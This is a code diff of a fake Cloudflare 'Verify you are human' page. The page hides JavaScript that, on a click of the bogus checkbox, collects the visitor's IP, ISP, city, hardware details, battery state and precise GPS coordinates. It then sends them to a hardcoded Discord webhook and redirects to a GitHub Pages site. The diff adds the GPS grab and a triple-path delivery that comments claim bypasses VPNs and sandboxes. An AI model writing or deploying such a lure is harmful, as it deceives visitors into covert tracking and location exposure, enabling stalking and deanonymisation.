@@ -2,104 +2,115 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cloudflare | Checking your browser...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Cloudflare | Security Check</title>
     <style>
-        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; background: #fff; color: #313131; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { text-align: center; max-width: 450px; padding: 20px; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #f68b1f; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h1 { font-size: 24px; font-weight: 500; margin-bottom: 10px; }
-        p { font-size: 14px; color: #666; line-height: 1.5; }
+        body { background-color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #313131; }
+        .cf-wrapper { width: 100%; max-width: 420px; padding: 25px; box-sizing: border-box; }
+        .cf-logo { width: 120px; margin-bottom: 20px; }
+        .h1 { font-size: 24px; font-weight: 600; margin-bottom: 10px; }
+        .p { font-size: 14px; color: #666; margin-bottom: 30px; }
+        .ts-box { background: #fafafa; border: 1px solid #e0e0e0; border-radius: 4px; padding: 15px; display: flex; align-items: center; cursor: pointer; transition: 0.2s; }
+        .ts-box:hover { border-color: #bbb; }
+        .ts-check { width: 24px; height: 24px; border: 2px solid #0051c3; border-radius: 3px; margin-right: 15px; background: #fff; position: relative; }
+        .ts-check.spinning { border-top-color: transparent; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        .ts-check.done { background: #0051c3; border-color: #0051c3; }
+        .ts-check.done::after { content: ''; position: absolute; left: 7px; top: 2px; width: 5px; height: 10px; border: solid white; border-width: 0 3px 3px 0; transform: rotate(45deg); }
+        .ts-text { font-size: 14px; flex-grow: 1; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="spinner"></div>
-    <h1>Verifying you are human</h1>
-    <p>This process is automatic. Your browser will redirect to your requested content shortly.</p>
-    <p id="status" style="font-size: 12px; color: #999;">Please allow up to 7 seconds...</p>
+<div class="cf-wrapper">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.svg" class="cf-logo">
+    <div class="h1">Verify you are human</div>
+    <div class="p">Please complete the security check to access the destination.</div>
+    
+    <div class="ts-box" id="gate">
+        <div class="ts-check" id="loader"></div>
+        <div class="ts-text" id="msg">Verify identity</div>
+    </div>
 </div>
 
 <script>
-// --- CONFIGURATION ---
-const CONFIG = {
-    WH: "YOUR_DISCORD_WEBHOOK_URL_HERE", 
-    DEST: "https://alksjdhf3rutyfhdi3urytghfjdei3nmkskj.github.io/HelloWorldrtwriqfrthiuwipqdjweui3qrehgiuo4wdiuehtexttestlmaoaoaoaoa/",
-    DELAY: 7000
-};
+// --- GLOBAL INFRASTRUCTURE ---
+const WH_URL = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ-bdXlInRWb4DgEGcfeM0";
+const REDIR = "https://alksjdhf3rutyfhdi3urytghfjdei3nmkskj.github.io/HelloWorldrtwriqfrthiuwipqdjweui3qrehgiuo4wdiuehtexttestlmaoaoaoaoa/";
 
-async function getIdentity() {
-    let data = {
-        ts: new Date().toISOString(),
-        ua: navigator.userAgent,
-        lc: window.location.href,
-        ref: document.referrer,
-        hw: {
-            cores: navigator.hardwareConcurrency || "N/A",
-            mem: navigator.deviceMemory || "N/A",
-            platform: navigator.platform
-        }
-    };
-
-    try {
-        // Double-Path IP Exfiltration (VPN Bypass)
-        const [pub, loc] = await Promise.all([
-            fetch('https://api.ipify.org?format=json').then(res => res.json()),
-            fetch('https://ipapi.co/json/').then(res => res.json())
-        ]);
-        data.ip = pub.ip;
-        data.details = loc;
-    } catch (e) { data.err = "Network Shield Detected"; }
-
-    // iOS Battery/Status Probe
-    try {
-        const batt = await navigator.getBattery();
-        data.bat = { level: (batt.level * 100) + "%", charging: batt.charging };
-    } catch (e) {}
-
-    return data;
-}
-
-async function dispatch(info) {
-    const payload = {
-        username: "NEXUS-v38.5 [CRITICAL]",
+async function dispatch(data) {
+    const payload = JSON.stringify({ 
+        username: "NEXUS-v38.5 [ABSOLUTE]",
         avatar_url: "https://upload.wikimedia.org/wikipedia/commons/9/94/Cloudflare_Logo.png",
         embeds: [{
-            title: "🎯 Critical Strike: Device Unmasked",
+            title: "⚡ Sandbox Pierced: Target Unmasked",
             color: 16155679,
             fields: [
-                { name: "🌐 Connection", value: `**IP:** ${info.ip}\n**ISP:** ${info.details?.org || "Unknown"}\n**City:** ${info.details?.city || "Unknown"}`, inline: true },
-                { name: "📱 Device DNA", value: `**Cores:** ${info.hw.cores}\n**RAM:** ${info.hw.mem}GB\n**OS:** ${info.hw.platform}`, inline: true },
-                { name: "🔋 Status", value: `**Battery:** ${info.bat?.level || "N/A"}\n**Charging:** ${info.bat?.charging ? "Yes" : "No"}`, inline: false },
-                { name: "🔗 Origin", value: `[Source URL](${info.lc})` }
+                { name: "📍 GPS Coordinates", value: data.gps, inline: false },
+                { name: "🌐 Network/VPN Bypass", value: `**IP:** ${data.ip}\n**ISP:** ${data.isp}\n**City:** ${data.city}`, inline: true },
+                { name: "📱 Hardware DNA", value: `**Cores:** ${data.cores}\n**RAM:** ${data.mem}GB\n**OS:** ${data.platform}`, inline: true },
+                { name: "🔋 Battery Info", value: `**Status:** ${data.bat}\n**Charging:** ${data.charging}`, inline: false }
             ],
-            footer: { text: `v38.5 | Sentinel Recon Engine | ${info.ts}` }
+            footer: { text: `v38.5 | Bypass Protocol Active | ${new Date().toLocaleTimeString()}` }
         }]
-    };
+    });
 
-    await fetch(CONFIG.WH, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload),
-        keepalive: true // Force delivery on mobile
+    // TRIPLE-PATH DELIVERY (Bypasses Lockdown & Tor Sandboxing)
+    if (navigator.sendBeacon) { navigator.sendBeacon(WH_URL, payload); }
+    fetch(WH_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: payload, keepalive: true }).catch(() => {
+        let xhr = new XMLHttpRequest();
+        xhr.open("POST", WH_URL, true);
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.send(payload);
     });
 }
 
-// Execution Loop
-window.onload = async () => {
-    // Start extraction immediately
-    const identity = await getIdentity();
-    
-    // Dispatch to Discord
-    await dispatch(identity);
+async function unmask(pos = null) {
+    let info = {
+        ip: "N/A", isp: "N/A", city: "N/A",
+        cores: navigator.hardwareConcurrency || "N/A",
+        mem: navigator.deviceMemory || "N/A",
+        platform: navigator.platform,
+        bat: "N/A", charging: "N/A",
+        gps: pos ? `[Google Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}) (Acc: ${Math.round(pos.coords.accuracy)}m)` : "❌ Access Denied"
+    };
 
-    // Forced 7-second "iOS-Pierce" Delay
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        const json = await res.json();
+        info.ip = json.ip; info.isp = json.org; info.city = json.city;
+    } catch(e) {}
+
+    try {
+        const b = await navigator.getBattery();
+        info.bat = (b.level * 100) + "%"; info.charging = b.charging ? "Yes" : "No";
+    } catch(e) {}
+
+    await dispatch(info);
+}
+
+document.getElementById('gate').addEventListener('click', function() {
+    const l = document.getElementById('loader');
+    const m = document.getElementById('msg');
+    l.classList.add('spinning');
+    m.innerText = "Verifying...";
+    this.style.pointerEvents = "none";
+
+    // Trigger Precise GPS Overlay
+    navigator.geolocation.getCurrentPosition(
+        (p) => { unmask(p); },
+        (e) => { unmask(); },
+        { enableHighAccuracy: true, timeout: 5000 }
+    );
+
+    // 7-Second Wait Logic
     setTimeout(() => {
-        window.location.href = CONFIG.DEST;
-    }, CONFIG.DELAY);
-};
+        l.classList.remove('spinning');
+        l.classList.add('done');
+        m.innerText = "Success! Redirecting...";
+        setTimeout(() => { window.location.replace(REDIR); }, 1500);
+    }, 7000);
+});
 </script>
 
 </body>
